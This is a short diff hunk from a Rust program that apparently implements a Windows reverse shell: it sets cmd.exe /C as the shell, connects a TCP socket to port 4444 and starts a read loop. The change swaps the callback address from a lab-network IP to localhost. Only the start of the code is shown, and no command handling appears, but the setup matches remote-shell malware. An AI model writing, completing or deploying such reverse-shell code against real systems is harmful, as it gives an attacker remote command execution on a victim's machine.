@@ -14,7 +14,7 @@ fn main() {
     let mut output = String::new();
     let mut shell = "cmd.exe";
     let mut shell_arg = "/C";
-    let mut socket = net::TcpStream::connect("192.168.56.1:4444").unwrap();
+    let mut socket = net::TcpStream::connect("127.0.0.1:4444").unwrap();
     
     loop {
         let mut buffer = [0; 1024];
